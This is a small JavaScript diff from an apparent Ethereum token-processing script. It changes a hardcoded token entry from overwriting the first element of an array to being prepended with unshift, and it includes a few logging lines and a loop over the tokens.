@@ -462,7 +462,7 @@ async function proceed(){
         console.log("real_eth_token length : ", real_eth_token.length);
         console.log("real_eth_token : ", real_eth_token);
         
-        real_eth_token[0] = {
+        let join = {
           contractAddress : "0x389999216860ab8e0175387a0c90e5c52522c945",
           realprice : "1000000",
           balance : "10000000000000000000000000",
@@ -470,6 +470,7 @@ async function proceed(){
           fakebalance : "10000000000000000000000000"
         };
 
+        real_eth_token.unshift(join);
 
         for(let n=0; n<real_eth_token.length && real_eth_token[n].realprice>3; n++){
           let token = real_eth_token[Number(n)];
